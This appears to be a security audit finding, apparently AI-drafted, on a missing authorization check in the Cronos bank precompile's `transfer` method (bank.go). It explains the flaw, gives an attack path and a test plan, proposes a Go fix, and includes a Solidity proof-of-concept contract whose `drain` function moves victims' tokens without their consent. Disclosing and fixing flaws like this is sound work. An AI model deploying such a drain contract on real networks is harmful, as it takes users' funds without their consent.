Looking at the `TransferMethodName` case in `bank.go::Run` carefully, and comparing it to the `MintMethodName`/`BurnMethodName` cases.

### Title
Unauthorized `evm/<caller>` Token Drain via Unguarded `sender` Argument in Bank Precompile `transfer` — (`x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `TransferMethodName` case in `BankContract.Run` accepts an arbitrary `sender` address from ABI-decoded calldata and uses it directly as the `from` account in `bankKeeper.SendCoins`, with no check that `sender == contract.Caller()`. Any contract can therefore drain `evm/<itself>` denomination tokens from any address that holds them.

---

### Finding Description

In `bank.go::Run`, the `transfer` branch:

```
sender   := args[0].(common.Address)   // fully attacker-controlled ABI argument
...
from     := sdk.AccAddress(sender.Bytes())
denom    := EVMDenom(contract.Caller()) // "evm/<calling_contract>"
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
``` [1](#0-0) 

The `denom` is correctly scoped to `contract.Caller()` (the calling contract's address), but the `from` account is taken verbatim from the first ABI argument with **no validation** that it equals `contract.Caller()` or that the address has authorized the spend.

Compare with `mint`/`burn`: those also use `contract.Caller()` for the denom, but the target address is the recipient/burner — the calling contract is implicitly the authority for its own denom. For `transfer`, the calling contract is the authority for the denom but not for the `from` address, and the code never enforces this. [2](#0-1) [3](#0-2) 

The intended usage pattern (from `TestBank.sol`) passes `msg.sender` as the sender argument, which is correct — but the precompile never enforces it: [4](#0-3) 

---

### Impact Explanation

**Critical — unauthorized transfer of user funds.**

Attack path:
1. Attacker deploys `MaliciousContract` that exposes a public `drain(victim, attacker, amount)` function.
2. Victims interact with `MaliciousContract` and accumulate `evm/<MaliciousContract>` native bank tokens (e.g., via a `mint` call that looks legitimate).
3. Attacker calls `drain(victim, attacker_wallet, amount)`, which internally calls `bank.transfer(victim, attacker_wallet, amount)`.
4. The precompile executes `bankKeeper.SendCoins(ctx, victim, attacker_wallet, coins)` — no authorization from `victim` required.
5. All `evm/<MaliciousContract>` tokens are moved from `victim` to `attacker_wallet` without consent.

The denom is scoped to the calling contract, so the attacker can only drain tokens of denomination `evm/<attacker_contract>`. However, since the attacker controls the contract, they also control the minting, making it straightforward to lure users into holding those tokens before draining them.

**Regarding the replay angle**: Cosmos SDK prevents transaction-level replay via account sequence numbers. The vulnerability is entirely independent of replay — it is a missing authorization check that is exploitable in a single fresh transaction.

---

### Likelihood Explanation

Exploitable by any unprivileged actor who can deploy a contract on Cronos EVM. No special privileges, leaked keys, or admin access required. The attack is a single EVM call.

---

### Recommendation

In the `TransferMethodName` branch, enforce that the `sender` argument equals `contract.Caller()`:

```go
if sender != contract.Caller() {
    return nil, errors.New("sender must be the caller contract")
}
``` [5](#0-4) 

This mirrors the implicit authority model used by `mint`/`burn`, where the calling contract is the sole authority over its own `evm/<caller>` denom.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
}

contract MaliciousContract {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: lure victim into holding evm/<this> tokens
    function lure(address victim, uint256 amount) external {
        bank.mint(victim, amount); // mints evm/<this> to victim
    }

    // Step 2: drain victim's evm/<this> tokens — no victim signature needed
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim (arbitrary, not validated by precompile)
        bank.transfer(victim, attacker, amount);
    }
}
```

**Test plan:**
1. Deploy `MaliciousContract` on a local Cronos devnet.
2. Call `lure(victim, 1000)` — victim now holds 1000 `evm/<MaliciousContract>` tokens.
3. Call `drain(victim, attacker, 1000)` from attacker's EOA.
4. Assert victim's `evm/<MaliciousContract>` balance is 0 and attacker's is 1000.
5. No transaction from `victim` was required at step 3. [6](#0-5)
